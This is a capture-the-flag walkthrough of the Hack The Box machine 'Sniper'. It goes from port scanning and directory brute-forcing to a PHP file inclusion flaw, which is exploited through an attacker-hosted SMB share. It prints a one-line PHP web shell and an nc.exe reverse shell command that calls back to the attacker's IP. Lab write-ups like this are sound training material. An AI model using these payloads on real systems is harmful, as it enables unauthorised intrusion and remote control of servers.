https://app.hackthebox.com/machines/211

## Sniper - Explore and Nmapping

New machine, no hints or something suspicious from a first look.
So we'll beging with nmap
```bat
sudo nmap -p- --min-rate 10000 -oA nmap 10.10.10.151
```

![NMAP RESULTS](https://is-going-to-rick-roll.me/1639739248.png)

from the nmap results we can see we have
<br>
* 80 - TCP HTTP
* 135 - TCP MSRPC
* 139 - TCP netbios-ssn
* 445 - TCP microsoft-ds

First of all we already know It's running on windows.
and we have a web panel running on port 80, let's namp these specific ports.


```bat
sudo nmap -p 80,135,139,445 -sV -sC -oA nmap-specific 10.10.10.151
```


meanwhile the nmap is running we can try and login with SMB without a username/and password.

```bat
net view 10.10.10.151

System error 5 has occurred.

Access is denied.
```
Denied.

<br>

The nmap result.
![NMAP RESULT #2](https://is-going-to-rick-roll.me/1639739651.png)

<br>

alright, it semees we'll have to investigate the website, before we'll start gobuster to find all the pages.
checking what is the engine of the website.
http://10.10.10.151/index.php - works

gobuster script (using SecList Discovery/Web-Content/raft-small-words-lowercase)

```bat
sudo gobuster dir -w ../../Helpers/SecLists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -o Sniper.txt -u http://10.10.10.151
```

In the website we have one page with two buttons and text, nothing too much

![website screenshot](https://is-going-to-rick-roll.me/1639741029.png)
<br>

Gobuster result show us we have much more pages than what we can see ->

```txt
/images               (Status: 301) [Size: 150] [--> http://10.10.10.151/images/]
/js                   (Status: 301) [Size: 146] [--> http://10.10.10.151/js/]
/index.php            (Status: 200) [Size: 2635]
/css                  (Status: 301) [Size: 147] [--> http://10.10.10.151/css/]
/user                 (Status: 301) [Size: 148] [--> http://10.10.10.151/user/]
/blog                 (Status: 301) [Size: 148] [--> http://10.10.10.151/blog/]
/.                    (Status: 200) [Size: 2635]
```
From here it looks like we found nothing except these pages, so we'll have to check them maually (or with tools if you have something good you trust)

After looking at each of the pages, the blog page is the one that has the most functions and maybe even vulnerabilities in the select language button. Lets send it over to Burp Suite.

![Burp Suite request](https://is-going-to-rick-roll.me/1639742702.png)
<br>
this is how the request looks like. and since this is requesting pages by the user selecting i think that this is how he implement this function

```php
include $_GET['lang'];
```
changing "?lang=" to test and it's redirecting us to a 404.

let's try fetching a system file with setting "?lang="'s value to "/windows/system.ini"

![found!](https://is-going-to-rick-roll.me/1639742931.png)
and... it worked. now let's see if we can LFI over SMB.

starting np

```bat
nc -lnvp 445
```

changing the get header in burp to ->
```txt
GET /blog/?lang=\\10.10.14.11\test HTTP/1.1
```

and we've got a request from the server.

![nvlvp result](https://is-going-to-rick-roll.me/1639746488.png)

###### Setting our new work directory

to continiue we'll have to modify smb.conf
```bat
sudo nano /etc/samba/smb.conf
```

add the following lines:
```conf
[htb]
path = /home/kali/htb/machines/sniper/www/
writable = no
guest ok = yes
guest only = yes
read only = yes
directory mode = 0555
force user = nobody
```

After modifyind the conf file you'll have to restart smb's services ->

```bat
service smbd restart

service nmbd restart
```

create new work dir
```bat
mkdir ~/htb/machines/sniper/www

cd ~/htb/machines/sniper/www

chmod 0555 ./  
```

check if our smb server is up and running, we can check it using the following command
```bat
smbmap -H 10.10.14.11
```

![smb server status](https://is-going-to-rick-roll.me/1639760640.png)


#### Setting up the RCE script

After we maked sure all the services are up and running we can make a new file in out new work directory named rcesrc.php

```bat
sudo nano rcesrc.php
```

and we'll write the next code into it.

```php
<?php system($_REQUEST['rce']); ?>
```

Now let's try it out and the parameter for lang that we are sending now will be <mark>\\10.10.14.5\htb\notrce.php&rce=whoami
</mark> (change the IP aadress with your own one)

form the result we can see that the RCE has worked and we executed code on the machine.
![burp result](https://is-going-to-rick-roll.me/1639760979.png)

Now before we'll continue we'll check what can we run by changing the parameter from "whoami" to "Powershell+$executionContext.SessionState.LanguageMode"

looking at the output we get "ConstrainedLanguage" this "tells" us that everything that interacts with .NET might will be blocked.

Now let's move the nc.exe file from the shares folder to our work directory that we setup earlier

```bat
sudo cp ~/../../usr/share/windows-resources/binaries/nc.exe .
```

Now, we can call this file to get it executed by the machine and get a shell. to do so we'll change the parameter again to nc.exe and send this connection back to us.


(make sure to encode this url in burp suite otherwise it will not execute)
```s
rce=\\10.10.14.11\htb\nc.exe 10.10.14.11 9001 -e powershell
```

and run netcat listner on the same port
```bat
sudo nc -lnvp 9001
```


![we've got connected!](https://is-going-to-rick-roll.me/1639761882.png)

congrats we have reverse shell!


##### Exploring the machine



<br><br><br><br>

###### All files and results cna be found in the "results" folder